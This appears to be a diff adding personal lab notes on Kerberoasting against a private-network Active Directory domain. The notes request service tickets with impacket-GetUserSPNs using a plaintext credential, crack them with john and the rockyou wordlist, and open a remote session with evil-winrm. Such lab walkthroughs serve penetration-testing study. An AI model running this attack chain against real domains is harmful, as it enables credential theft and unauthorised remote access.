@@ -1,1 +1,22 @@
-m
+# 1) run impacket-GetUserSPNs
+
+impacket-GetUserSPNs -dc-ip 192.168.56.107 skypia.org/penni.andrea:computer
+
+To get the services names
+
+# 2) now get ticket for the services
+
+impacket-GetUserSPNs -dc-ip 192.168.56.107 -request skypia.org/penni.andrea:computer
+
+# 3) get the passwords from hash
+
+john --format=krb5tgs mssql_svc --wordlist=/usr/share/wordlists/rockyou.txt
+
+And that how you get the password from the hash 
+
+For the other to we wil use a different wordl list by installin seclsit 
+apt -y install seclists
+
+# 4) we can get remote accses by using evil-winrm
+
+evil-winrm -i 192.168.56.107 -u mssql_svc
